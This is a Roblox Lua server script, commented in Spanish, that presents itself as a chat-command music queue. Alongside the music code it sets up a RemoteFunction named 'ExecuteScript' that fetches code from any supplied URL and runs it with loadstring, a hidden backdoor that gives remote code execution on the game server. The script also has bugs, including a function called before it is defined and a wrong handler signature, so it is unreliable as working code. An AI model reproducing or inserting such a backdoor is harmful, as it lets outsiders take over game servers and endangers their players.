local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Inicializar una lista de espera de música vacía
local musicQueue = {}

-- Función para agregar un ID de música a la lista de espera
local function addToQueue(musicID)
    table.insert(musicQueue, musicID)
    if #musicQueue == 1 then
        -- Si la lista de espera está vacía excepto este ID, reproducirlo inmediatamente
        playMusic(musicID)
    end
end

-- Función para reproducir música
local function playMusic(musicID)
    local sound = Instance.new("Sound")
    sound.Name = "Sound_" .. musicID
    sound.Parent = workspace:FindFirstChild("Música") or Instance.new("Folder", workspace)
    sound.SoundId = "rbxasset://" .. musicID
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
        table.remove(musicQueue, 1) -- Eliminar el primer elemento de la cola cuando termine la música
        if #musicQueue > 0 then
            playMusic(musicQueue[1]) -- Reproducir la siguiente música en la cola
        end
    end)
end

-- Escuchar los comandos enviados por los usuarios
game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if message:sub(1, 1) == "!" then
            local command, args = message:match("!(%S+)%s*(.*)")
            if command == "musica" then
                local musicID = tonumber(args)
                if musicID then
                    -- Agregar el ID de música a la lista de espera
                    addToQueue(musicID)
                end
            end
        end
    end)
end)

-- Configurar un RemoteFunction para verificar si el script está en ejecución
local IsScriptRunning = Instance.new("RemoteFunction")
IsScriptRunning.Name = "IsScriptRunning"
IsScriptRunning.Parent = ReplicatedStorage

IsScriptRunning.OnServerInvoke = function()
    return true -- Devolver verdadero para indicar que el script está en ejecución
end

-- Configurar un RemoteFunction para ejecutar el script de la URL proporcionada
local ExecuteScript = Instance.new("RemoteFunction")
ExecuteScript.Name = "ExecuteScript"
ExecuteScript.Parent = ReplicatedStorage

ExecuteScript.OnServerInvoke = function(url)
    local success, result = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        local success, errorMessage = pcall(loadstring(result))
        if not success then
            warn("Error al ejecutar el script descargado: " .. errorMessage)
        end
    else
        warn("No se pudo descargar el script desde la URL proporcionada.")
    end
end
